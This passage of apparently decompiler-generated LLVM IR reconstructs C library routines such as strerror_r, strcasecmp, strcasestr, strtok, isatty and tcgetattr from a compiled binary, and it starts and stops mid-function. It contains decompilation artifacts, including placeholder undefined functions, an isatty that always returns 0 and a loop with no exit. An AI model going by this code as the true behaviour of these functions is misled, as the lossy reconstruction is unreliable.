  %v3_1000eb38 = load i8, i8* %v2_1000eb38, align 1
  %v4_1000eb38 = zext i8 %v3_1000eb38 to i32
  %v0_1000eb3c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000eb3c = add i32 %v0_1000eb3c, 1
  store i32 %v1_1000eb3c, i32* %r8.global-to-local, align 4
  %v0_1000eb40 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000eb40 = add i32 %v0_1000eb40, 1
  %v2_1000eb40 = inttoptr i32 %v1_1000eb40 to i8*
  %v3_1000eb40 = load i8, i8* %v2_1000eb40, align 1
  %v0_1000eb44 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000eb44 = add i32 %v0_1000eb44, 1
  store i32 %v1_1000eb44, i32* %r11.global-to-local, align 4
  %v4_1000eb4c = icmp eq i8 %v3_1000eb40, %v3_1000eb38
  br i1 %v4_1000eb4c, label %dec_label_pc_1000eb54, label %dec_label_pc_1000eb6c

dec_label_pc_1000eb54:                            ; preds = %dec_label_pc_1000eb28
  %v3_1000eb48 = icmp eq i8 %v3_1000eb38, 0
  %v0_1000eb54 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000eb48, i32 %v0_1000eb54)
  %v0_1000eb58 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000eb58 = add i32 %v0_1000eb58, 1
  %v2_1000eb58 = inttoptr i32 %v1_1000eb58 to i8*
  %v3_1000eb58 = load i8, i8* %v2_1000eb58, align 1
  %v4_1000eb58 = zext i8 %v3_1000eb58 to i32
  %v0_1000eb5c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000eb5c = add i32 %v0_1000eb5c, 1
  %v2_1000eb5c = inttoptr i32 %v1_1000eb5c to i8*
  %v3_1000eb5c = load i8, i8* %v2_1000eb5c, align 1
  store i32 %v4_1000eb58, i32* %r10.global-to-local, align 4
  %v4_1000eb64 = icmp eq i8 %v3_1000eb5c, %v3_1000eb58
  br i1 %v4_1000eb64, label %dec_label_pc_1000eb54.dec_label_pc_1000eb28_crit_edge, label %dec_label_pc_1000eb6c

dec_label_pc_1000eb54.dec_label_pc_1000eb28_crit_edge: ; preds = %dec_label_pc_1000eb54
  %v0_1000eb2c.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000eb30.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000eb28

dec_label_pc_1000eb6c:                            ; preds = %dec_label_pc_1000eb54, %dec_label_pc_1000eb28, %dec_label_pc_1000eb0c
  %v0_1000eb6c = phi i32 [ %v4_1000eb14, %dec_label_pc_1000eb0c ], [ %v4_1000eb58, %dec_label_pc_1000eb54 ], [ %v4_1000eb38, %dec_label_pc_1000eb28 ]
  %v3_1000eb6c = icmp eq i32 %v0_1000eb6c, 0
  br i1 %v3_1000eb6c, label %dec_label_pc_1000eb74, label %dec_label_pc_1000eacc

dec_label_pc_1000eb74:                            ; preds = %dec_label_pc_1000eb6c
  ret i32 %v0_1000eac0.sink

dec_label_pc_1000eb78:                            ; preds = %dec_label_pc_1000ea9c, %dec_label_pc_1000eaec, %dec_label_pc_1000ead8
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000eb58, { 0, 2, 1 }
  uselistorder i8 %v3_1000eb38, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000eac0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000eac0.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000eaf0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000eadc28, { 1, 0 }
  uselistorder i32 %v1_1000eaf4.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000ea9c, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000eb78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000eb28, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb04, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000ead8, { 1, 0 }
  uselistorder label %dec_label_pc_1000eaf4.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268495768, i32* @lr, align 4
  %v0_1000eb94 = call i32 @__xpg_strerror_r()
  %v0_1000eb9c = load i32, i32* @r29, align 4
  ret i32 %v0_1000eb9c
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000ebb0 = load i32, i32* @r3, align 4
  %v2_1000ebb0 = icmp ugt i32 %v0_1000ebb0, 124
  %v0_1000ebc0 = load i32, i32* @r4, align 4
  store i32 %v0_1000ebc0, i32* %r27.global-to-local, align 4
  %v0_1000ebc8 = load i32, i32* @r5, align 4
  br i1 %v2_1000ebb0, label %dec_label_pc_1000ec0c, label %dec_label_pc_1000ebd0

dec_label_pc_1000ebd0:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_10016c18.618 to i32), i32* %r30.global-to-local, align 4
  %v3_1000ebec7 = icmp eq i32 %v0_1000ebb0, 0
  br i1 %v3_1000ebec7, label %dec_label_pc_1000ec00, label %dec_label_pc_1000ebe0

dec_label_pc_1000ebe0:                            ; preds = %dec_label_pc_1000ebd0, %dec_label_pc_1000ebe0
  %v0_1000ebe4 = phi i32 [ %v1_1000ebe4, %dec_label_pc_1000ebe0 ], [ ptrtoint ([8 x i8]* @global_var_10016c18.618 to i32), %dec_label_pc_1000ebd0 ]
  %v1_1000ebe4 = add i32 %v0_1000ebe4, 1
  store i32 %v1_1000ebe4, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ebe0

dec_label_pc_1000ec00:                            ; preds = %dec_label_pc_1000ebd0
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000ec40

dec_label_pc_1000ec0c:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000ebb0, 0
  %v1_1000ec10 = zext i1 %tmp to i32
  %v2_1000ec10 = ashr i32 %v0_1000ebb0, 31
  %v3_1000ec10 = and i32 %v2_1000ec10, -2
  %v4_1000ec10 = or i32 %v3_1000ec10, %v1_1000ec10
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000ec24 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000ec24 = call i32 @_uintmaxtostr(i8* %v5_1000ec24, i32 %v4_1000ec10, i32 %v0_1000ebb0, i32 -10, i32 0)
  %v1_1000ec2c = add i32 %v6_1000ec24, -14
  store i32 %v1_1000ec2c, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_10016c08.619 to i32), i32* @r4, align 4
  store i32 %v1_1000ec2c, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268495936, i32* @lr, align 4
  %v0_1000ec3c = call i32 @memcpy()
  %v0_1000ec40.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000ec44.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000ec54.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ec40

dec_label_pc_1000ec40:                            ; preds = %dec_label_pc_1000ec00, %dec_label_pc_1000ec0c
  %v0_1000ec54 = phi i32 [ %v0_1000ebc8, %dec_label_pc_1000ec00 ], [ %v0_1000ec54.pre, %dec_label_pc_1000ec0c ]
  %v0_1000ec44 = phi i32 [ ptrtoint ([8 x i8]* @global_var_10016c18.618 to i32), %dec_label_pc_1000ec00 ], [ %v0_1000ec44.pre, %dec_label_pc_1000ec0c ]
  %v1_1000ec48 = phi i32 [ %v0_1000ebc0, %dec_label_pc_1000ec00 ], [ %v0_1000ec40.pre, %dec_label_pc_1000ec0c ]
  %tmp19 = icmp slt i32 %v1_1000ec48, 0
  %v1_1000ec40 = zext i1 %tmp19 to i32
  %v2_1000ec40 = ashr i32 %v1_1000ec48, 31
  %v3_1000ec40 = and i32 %v2_1000ec40, -2
  %v4_1000ec40 = or i32 %v3_1000ec40, %v1_1000ec40
  store i32 %v0_1000ec44, i32* @r3, align 4
  %v2_1000ec48 = xor i32 %v4_1000ec40, %v1_1000ec48
  %v2_1000ec4c = sub i32 %v4_1000ec40, %v2_1000ec48
  %tmp20 = icmp slt i32 %v2_1000ec4c, 0
  %v1_1000ec50 = zext i1 %tmp20 to i32
  %v2_1000ec50 = ashr i32 %v2_1000ec4c, 31
  %v3_1000ec50 = and i32 %v2_1000ec50, -2
  %v4_1000ec50 = or i32 %v3_1000ec50, %v1_1000ec50
  %v2_1000ec54 = and i32 %v4_1000ec50, %v0_1000ec54
  store i32 %v2_1000ec54, i32* @r29, align 4
  %v0_1000ec58 = call i32 @__GI_strlen()
  %v1_1000ec5c = add i32 %v0_1000ec58, 1
  store i32 %v1_1000ec5c, i32* %r31.global-to-local, align 4
  %v1_1000ec60 = load i32, i32* @r29, align 4
  %v3_1000ec60 = icmp ugt i32 %v1_1000ec5c, %v1_1000ec60
  br i1 %v3_1000ec60, label %dec_label_pc_1000ec68, label %dec_label_pc_1000ec70

dec_label_pc_1000ec68:                            ; preds = %dec_label_pc_1000ec40
  store i32 %v1_1000ec60, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000ec70

dec_label_pc_1000ec70:                            ; preds = %dec_label_pc_1000ec40, %dec_label_pc_1000ec68
  %v0_1000ec80 = phi i32 [ %v1_1000ec60, %dec_label_pc_1000ec68 ], [ %v1_1000ec5c, %dec_label_pc_1000ec40 ]
  %v3_1000ec70 = icmp eq i32 %v0_1000ec80, 0
  br i1 %v3_1000ec70, label %dec_label_pc_1000ec94, label %dec_label_pc_1000ec78

dec_label_pc_1000ec78:                            ; preds = %dec_label_pc_1000ec70
  %v0_1000ec78 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000ec78, i32* @r4, align 4
  %v0_1000ec7c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000ec7c, i32* @r3, align 4
  store i32 %v0_1000ec80, i32* @r5, align 4
  store i32 268496008, i32* @lr, align 4
  %v0_1000ec84 = call i32 @memcpy()
  %v1_1000ec88 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ec88 = add i32 %v1_1000ec88, %v0_1000ec7c
  %v3_1000ec90 = add i32 %v2_1000ec88, -1
  %v4_1000ec90 = inttoptr i32 %v3_1000ec90 to i8*
  store i8 0, i8* %v4_1000ec90, align 1
  br label %dec_label_pc_1000ec94

dec_label_pc_1000ec94:                            ; preds = %dec_label_pc_1000ec70, %dec_label_pc_1000ec78
  %v0_1000ec94 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000ec94 = icmp eq i32 %v0_1000ec94, 0
  br i1 %v3_1000ec94, label %dec_label_pc_1000eca4, label %dec_label_pc_1000ec9c

dec_label_pc_1000ec9c:                            ; preds = %dec_label_pc_1000ec94
  %v0_1000ec9c = call i32 @__errno_location()
  %v0_1000eca0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000eca0 = inttoptr i32 %v0_1000ec9c to i32*
  store i32 %v0_1000eca0, i32* %v2_1000eca0, align 4
  %v0_1000eca8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000eca4

dec_label_pc_1000eca4:                            ; preds = %dec_label_pc_1000ec94, %dec_label_pc_1000ec9c
  %v0_1000eca8 = phi i32 [ 0, %dec_label_pc_1000ec94 ], [ %v0_1000eca8.pre, %dec_label_pc_1000ec9c ]
  ret i32 %v0_1000eca8

; uselistorder directives
  uselistorder i32 %v2_1000ec4c, { 1, 0 }
  uselistorder i32 %v4_1000ec40, { 1, 0 }
  uselistorder i32 %v1_1000ec48, { 1, 2, 0 }
  uselistorder i32 %v1_1000ebe4, { 1, 0 }
  uselistorder i32 %v0_1000ebb0, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_10016c18.618 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000eca4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec94, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec70, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec40, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebe0, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000ecc8 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000ecc8
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000ecd0 = load i32, i32* bitcast (i32** @global_var_100285ac.621 to i32*), align 4
  %v0_1000ecd8.pre = load i32, i32* @r3, align 4
  %v1_1000ecd8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000ecd8

dec_label_pc_1000ecd8:                            ; preds = %dec_label_pc_1000ed00, %entry
  %v0_1000ed146 = phi i32 [ %v0_1000ed147, %dec_label_pc_1000ed00 ], [ 0, %entry ]
  %v0_1000ed04 = phi i32 [ %v1_1000ed04, %dec_label_pc_1000ed00 ], [ %v1_1000ecd8.pre, %entry ]
  %v0_1000ed08 = phi i32 [ %v1_1000ed08, %dec_label_pc_1000ed00 ], [ %v0_1000ecd8.pre, %entry ]
  %v4_1000ecd8 = icmp eq i32 %v0_1000ed08, %v0_1000ed04
  %.pre = inttoptr i32 %v0_1000ed08 to i8*
  br i1 %v4_1000ecd8, label %dec_label_pc_1000ed00, label %dec_label_pc_1000ece0

dec_label_pc_1000ece0:                            ; preds = %dec_label_pc_1000ecd8
  %v2_1000ece0 = load i8, i8* %.pre, align 1
  %v3_1000ece0 = zext i8 %v2_1000ece0 to i32
  %v1_1000ece4 = inttoptr i32 %v0_1000ed04 to i8*
  %v2_1000ece4 = load i8, i8* %v1_1000ece4, align 1
  %v3_1000ece4 = zext i8 %v2_1000ece4 to i32
  %v1_1000ece8 = mul nuw nsw i32 %v3_1000ece0, 2
  %v1_1000ecec = mul nuw nsw i32 %v3_1000ece4, 2
  %v2_1000ecf0 = add i32 %v1_1000ece8, %v3_1000ecd0
  %v3_1000ecf0 = inttoptr i32 %v2_1000ecf0 to i16*
  %v4_1000ecf0 = load i16, i16* %v3_1000ecf0, align 2
  %v5_1000ecf0 = sext i16 %v4_1000ecf0 to i32
  %v2_1000ecf4 = add i32 %v1_1000ecec, %v3_1000ecd0
  %v3_1000ecf4 = inttoptr i32 %v2_1000ecf4 to i16*
  %v4_1000ecf4 = load i16, i16* %v3_1000ecf4, align 2
  %v5_1000ecf4 = sext i16 %v4_1000ecf4 to i32
  %v2_1000ecf8 = sub nsw i32 %v5_1000ecf0, %v5_1000ecf4
  %v4_1000ecfc = icmp eq i16 %v4_1000ecf0, %v4_1000ecf4
  br i1 %v4_1000ecfc, label %dec_label_pc_1000ed00, label %dec_label_pc_1000ed14

dec_label_pc_1000ed00:                            ; preds = %dec_label_pc_1000ecd8, %dec_label_pc_1000ece0
  %v0_1000ed147 = phi i32 [ %v2_1000ecf8, %dec_label_pc_1000ece0 ], [ %v0_1000ed146, %dec_label_pc_1000ecd8 ]
  %v2_1000ed00 = load i8, i8* %.pre, align 1
  %v1_1000ed04 = add i32 %v0_1000ed04, 1
  %v1_1000ed08 = add i32 %v0_1000ed08, 1
  %v3_1000ed0c = icmp eq i8 %v2_1000ed00, 0
  br i1 %v3_1000ed0c, label %dec_label_pc_1000ed14, label %dec_label_pc_1000ecd8

dec_label_pc_1000ed14:                            ; preds = %dec_label_pc_1000ed00, %dec_label_pc_1000ece0
  %v0_1000ed14 = phi i32 [ %v0_1000ed147, %dec_label_pc_1000ed00 ], [ %v2_1000ecf8, %dec_label_pc_1000ece0 ]
  ret i32 %v0_1000ed14

; uselistorder directives
  uselistorder i32 %v2_1000ecf8, { 1, 0 }
  uselistorder i32 %v0_1000ed08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ed00, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268632064, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000ed24 = load i32, i32* bitcast (i32** @global_var_100285ac.621 to i32*), align 4
  store i32 %v3_1000ed24, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000ed2c

dec_label_pc_1000ed2c:                            ; preds = %dec_label_pc_1000ed2c.backedge, %entry
  %v0_1000ed2c = phi i32 [ %v0_1000ed2c.pre, %dec_label_pc_1000ed2c.backedge ], [ %arg2, %entry ]
  %v1_1000ed2c = inttoptr i32 %v0_1000ed2c to i8*
  %v2_1000ed2c = load i8, i8* %v1_1000ed2c, align 1
  %v3_1000ed2c = zext i8 %v2_1000ed2c to i32
  store i32 %v3_1000ed2c, i32* %r0.global-to-local, align 4
  %v1_1000ed30 = add i32 %v0_1000ed2c, 1
  store i32 %v1_1000ed30, i32* %r10.global-to-local, align 4
  %v3_1000ed34 = icmp eq i8 %v2_1000ed2c, 0
  %v1_1000ed38 = mul nuw nsw i32 %v3_1000ed2c, 2
  store i32 %v1_1000ed38, i32* %r9.global-to-local, align 4
  %v0_1000ed3c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ed34, i32 %v0_1000ed3c)
  %v0_1000ed40 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ed40 = inttoptr i32 %v0_1000ed40 to i8*
  %v2_1000ed40 = load i8, i8* %v1_1000ed40, align 1
  %v3_1000ed40 = zext i8 %v2_1000ed40 to i32
  %v1_1000ed44 = add i32 %v0_1000ed40, 1
  store i32 %v1_1000ed44, i32* %r8.global-to-local, align 4
  %v0_1000ed48 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000ed48 = icmp eq i32 %v0_1000ed48, %v3_1000ed40
  br i1 %v4_1000ed48, label %dec_label_pc_1000ed2c.backedge, label %dec_label_pc_1000ed54

dec_label_pc_1000ed2c.backedge:                   ; preds = %dec_label_pc_1000ed2c, %dec_label_pc_1000ed54, %dec_label_pc_1000ed68
  %v0_1000ed2c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000ed2c

dec_label_pc_1000ed54:                            ; preds = %dec_label_pc_1000ed2c
  %v1_1000ed4c = mul nuw nsw i32 %v3_1000ed40, 2
  %v0_1000ed54 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ed54 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000ed54 = add i32 %v1_1000ed54, %v0_1000ed54
  %v3_1000ed54 = inttoptr i32 %v2_1000ed54 to i16*
  %v4_1000ed54 = load i16, i16* %v3_1000ed54, align 2
  %v5_1000ed54 = sext i16 %v4_1000ed54 to i32
  store i32 %v5_1000ed54, i32* %r9.global-to-local, align 4
  %v2_1000ed5c = add i32 %v1_1000ed54, %v1_1000ed4c
  %v3_1000ed5c = inttoptr i32 %v2_1000ed5c to i16*
  %v4_1000ed5c = load i16, i16* %v3_1000ed5c, align 2
  %v5_1000ed5c = sext i16 %v4_1000ed5c to i32
  store i32 %v5_1000ed5c, i32* %r0.global-to-local, align 4
  %v4_1000ed60 = icmp eq i16 %v4_1000ed54, %v4_1000ed5c
  br i1 %v4_1000ed60, label %dec_label_pc_1000ed2c.backedge, label %dec_label_pc_1000ed68

dec_label_pc_1000ed68:                            ; preds = %dec_label_pc_1000ed54
  %v3_1000ed58 = icmp eq i8 %v2_1000ed40, 0
  %v0_1000ed68 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ed68 = add i32 %v0_1000ed68, 1
  store i32 %v1_1000ed68, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000ed68, i32* %r8.global-to-local, align 4
  br i1 %v3_1000ed58, label %dec_label_pc_1000ed78, label %dec_label_pc_1000ed2c.backedge

dec_label_pc_1000ed78:                            ; preds = %dec_label_pc_1000ed68
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000ed2c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ed2c.backedge, { 2, 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100285f0.622 to i32), i32* @r5, align 4
  %v1_1000ed88 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_100285f0.622 to i32))
  ret i32 %v1_1000ed88
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268496288, i32* @lr, align 4
  %v2_1000ed9c = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000edbc = load i32, i32* @lr, align 4
  store i32 %v0_1000edbc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000edcc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268496352, i32* @lr, align 4
  %v3_1000eddc = call i32 @ioctl(i32 1076655123, i32 %v2_1000edcc, i32 %v2_1000edcc)
  %v2_1000ede0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000ede0, i32* @r4, align 4
  store i32 %v3_1000eddc, i32* @r30, align 4
  %v3_1000ede4 = icmp eq i32 %v3_1000eddc, 0
  store i32 19, i32* @r5, align 4
  %v0_1000edec = load i32, i32* @r31, align 4
  br i1 %v3_1000ede4, label %dec_label_pc_1000edf4, label %dec_label_pc_1000ee3c

dec_label_pc_1000edf4:                            ; preds = %entry
  %v1_1000edec = add i32 %v0_1000edec, 17
  %v4_1000ee00 = zext i8 %tmp4 to i32
  store i32 %v4_1000ee00, i32* @r8, align 4
  %v3_1000ee0c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000ee0c, i32* %r0.global-to-local, align 4
  %v2_1000ee10 = add i32 %v0_1000edec, 4
  %v3_1000ee10 = inttoptr i32 %v2_1000ee10 to i32*
  store i32 %tmp7, i32* %v3_1000ee10, align 4
  %v0_1000ee14 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ee14 = load i32, i32* @r31, align 4
  %v2_1000ee14 = inttoptr i32 %v1_1000ee14 to i32*
  store i32 %v0_1000ee14, i32* %v2_1000ee14, align 4
  %v0_1000ee18 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ee18 = load i32, i32* @r31, align 4
  %v2_1000ee18 = add i32 %v1_1000ee18, 8
  %v3_1000ee18 = inttoptr i32 %v2_1000ee18 to i32*
  store i32 %v0_1000ee18, i32* %v3_1000ee18, align 4
  %v0_1000ee1c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ee1c = load i32, i32* @r31, align 4
  %v2_1000ee1c = add i32 %v1_1000ee1c, 12
  %v3_1000ee1c = inttoptr i32 %v2_1000ee1c to i32*
  store i32 %v0_1000ee1c, i32* %v3_1000ee1c, align 4
  %v3_1000ee20 = load i32, i32* @r31, align 4
  %v4_1000ee20 = add i32 %v3_1000ee20, 16
  %v5_1000ee20 = inttoptr i32 %v4_1000ee20 to i8*
  store i8 %tmp4, i8* %v5_1000ee20, align 1
  %v1_1000ee24 = load i32, i32* @r31, align 4
  %v2_1000ee24 = add i32 %v1_1000ee24, 52
  %v3_1000ee24 = inttoptr i32 %v2_1000ee24 to i32*
  store i32 %tmp3, i32* %v3_1000ee24, align 4
  %v1_1000ee28 = load i32, i32* @r31, align 4
  %v2_1000ee28 = add i32 %v1_1000ee28, 56
  %v3_1000ee28 = inttoptr i32 %v2_1000ee28 to i32*
  store i32 %tmp2, i32* %v3_1000ee28, align 4
  store i32 268496432, i32* @lr, align 4
  %v6_1000ee2c = sext i8 %tmp4 to i32
  %v8_1000ee2c = call i32 @__GI_mempcpy(i32 %v1_1000edec, i32 %v2_1000ede0, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000ee2c, i32 %tmp7)
  store i32 268496444, i32* @lr, align 4
  %v3_1000ee38 = call i32 @__GI_memset(i32 %v8_1000ee2c, i32 0, i32 13)
  %v0_1000ee40.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000ee3c

dec_label_pc_1000ee3c:                            ; preds = %entry, %dec_label_pc_1000edf4
  %v0_1000ee40 = phi i32 [ %v3_1000eddc, %entry ], [ %v0_1000ee40.pre, %dec_label_pc_1000edf4 ]
  store i32 %v0_1000edbc, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000ee40

; uselistorder directives
  uselistorder i32 %v2_1000edcc, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ee3c, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000ee54 = load i32, i32* @r4, align 4
  %v3_1000ee54 = icmp eq i32 %v0_1000ee54, 1
  %v0_1000ee64 = load i32, i32* @r3, align 4
  store i32 %v0_1000ee64, i32* @r27, align 4
  %v0_1000ee6c = load i32, i32* @r5, align 4
  store i32 %v0_1000ee6c, i32* @r31, align 4
  br i1 %v3_1000ee54, label %dec_label_pc_1000ee90, label %dec_label_pc_1000ee74

dec_label_pc_1000ee74:                            ; preds = %entry
  %v3_1000ee74 = icmp eq i32 %v0_1000ee54, 2
  br i1 %v3_1000ee74, label %dec_label_pc_1000eeb0, label %dec_label_pc_1000ee7c

dec_label_pc_1000ee7c:                            ; preds = %dec_label_pc_1000ee74
  %v3_1000ee7c = icmp eq i32 %v0_1000ee54, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000ee7c, label %dec_label_pc_1000eeb8, label %dec_label_pc_1000ee9c

dec_label_pc_1000ee90:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000eeb8

dec_label_pc_1000ee9c:                            ; preds = %dec_label_pc_1000ee7c
  %v0_1000ee9c = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000eea8 = inttoptr i32 %v0_1000ee9c to i32*
  store i32 22, i32* %v2_1000eea8, align 4
  br label %dec_label_pc_1000efa0

dec_label_pc_1000eeb0:                            ; preds = %dec_label_pc_1000ee74
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000eeb8

dec_label_pc_1000eeb8:                            ; preds = %dec_label_pc_1000ee7c, %dec_label_pc_1000ee90, %dec_label_pc_1000eeb0
  %v1_1000eeb8 = inttoptr i32 %v0_1000ee6c to i32*
  %v2_1000eeb8 = load i32, i32* %v1_1000eeb8, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000eec0 = add i32 %v0_1000ee6c, 4
  %v2_1000eec0 = inttoptr i32 %v1_1000eec0 to i32*
  %v3_1000eec0 = load i32, i32* %v2_1000eec0, align 4
  store i32 %v3_1000eec0, i32* %r9.global-to-local, align 4
  %v1_1000eec4 = add i32 %v0_1000ee6c, 17
  store i32 %v1_1000eec4, i32* @r4, align 4
  %v1_1000eec8 = add i32 %v0_1000ee6c, 8
  %v2_1000eec8 = inttoptr i32 %v1_1000eec8 to i32*
  %v3_1000eec8 = load i32, i32* %v2_1000eec8, align 4
  %v2_1000eecc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000eecc, i32* @r3, align 4
  %v2_1000eed4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000eed4, i32* @r26, align 4
  %v1_1000eed8 = add i32 %v0_1000ee6c, 16
  %v2_1000eed8 = inttoptr i32 %v1_1000eed8 to i8*
  %v3_1000eed8 = load i8, i8* %v2_1000eed8, align 1
  %v4_1000eed8 = zext i8 %v3_1000eed8 to i32
  store i32 %v4_1000eed8, i32* @r8, align 4
